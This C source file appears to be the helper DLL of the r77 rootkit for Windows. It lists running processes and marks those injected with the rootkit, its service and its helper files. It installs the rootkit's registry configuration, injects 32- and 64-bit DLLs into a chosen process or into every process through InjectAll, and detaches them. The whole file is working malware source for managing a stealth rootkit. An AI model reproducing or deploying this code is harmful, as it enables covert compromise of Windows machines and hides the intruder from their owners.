#include "Helper.h"
#include "r77def.h"
#include "r77win.h"
#include "r77config.h"
#include "r77process.h"
#include <Shlwapi.h>
#include <tlhelp32.h>
#include <Psapi.h>

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
{
	return TRUE;
}

BOOL GetProcessList(PPROCESS_LIST_ENTRY entries, LPDWORD count)
{
	BOOL result = FALSE;
	*count = 0;

	// Get r77 configuration to determine which processes are hidden by ID.
	PR77_CONFIG r77Config = LoadR77Config();

	// Get all processes with an r77 signature. The signature indicates either,
	//  - that a process is injected with the rootkit,
	//  - or that it's the r77 service,
	//  - or that it's an r77 helper file.

	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
	DWORD r77ProcessCount = 1000;
	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (snapshot != INVALID_HANDLE_VALUE)
		{
			PROCESSENTRY32W processEntry;
			processEntry.dwSize = sizeof(PROCESSENTRY32W);

			for (BOOL enumerate = Process32FirstW(snapshot, &processEntry); enumerate; enumerate = Process32NextW(snapshot, &processEntry))
			{
				PPROCESS_LIST_ENTRY entry = &entries[(*count)++];
				entry->ProcessId = processEntry.th32ProcessID;
				StrCpyW(entry->Name, processEntry.szExeFile);
				GetProcessFileName(processEntry.th32ProcessID, TRUE, entry->FullName, MAX_PATH);

				BOOL is64Bit;
				if (Is64BitProcess(processEntry.th32ProcessID, &is64Bit))
				{
					entry->Platform = is64Bit ? 64 : 32;
				}
				else
				{
					entry->Platform = -1;
				}

				entry->IntegrityLevel = -1;
				HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
				if (process)
				{
					GetProcessIntegrityLevel(process, &entry->IntegrityLevel);

					DWORD userNameLength = 256;
					if (!GetProcessUserName(process, entry->UserName, &userNameLength))
					{
						entry->UserName[0] = L'\0';
					}

					CloseHandle(process);
				}

				for (DWORD i = 0; i < r77ProcessCount; i++)
				{
					if (r77Processes[i].ProcessId == processEntry.th32ProcessID)
					{
						// If the process is in the list of r77 processes, its signature will tell what kind of r77 process it is.

						if (r77Processes[i].Signature == R77_SIGNATURE) entry->IsInjected = TRUE;
						else if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE) entry->IsR77Service = TRUE;
						else if (r77Processes[i].Signature == R77_HELPER_SIGNATURE) entry->IsHelper = TRUE;

						break;
					}
				}

				entry->IsHiddenById = IntegerListContains(r77Config->HiddenProcessIds, processEntry.th32ProcessID);
			}

			CloseHandle(snapshot);
			result = TRUE;
		}
	}

	DeleteR77Config(r77Config);
	FREE(r77Processes);

	return result;
}
BOOL CreateConfigSystem()
{
	HKEY key;
	if (InstallR77Config(&key))
	{
		RegCloseKey(key);
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
BOOL Inject(DWORD processId, LPBYTE dll, DWORD dllSize)
{
	return InjectDll(processId, dll, dllSize);
}
BOOL InjectAll(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size)
{
	BOOL result = FALSE;

	LPDWORD processes = NEW_ARRAY(DWORD, 10000);
	DWORD processCount = 0;
	if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
	{
		processCount /= sizeof(DWORD);

		for (DWORD i = 0; i < processCount; i++)
		{
			InjectDll(processes[i], dll32, dll32Size);
			InjectDll(processes[i], dll64, dll64Size);
		}

		result = TRUE;
	}

	FREE(processes);
	return result;
}
BOOL Detach(DWORD processId)
{
	return DetachInjectedProcessById(processId);
}
BOOL DetachAll()
{
	DetachAllInjectedProcesses();
	return TRUE;
}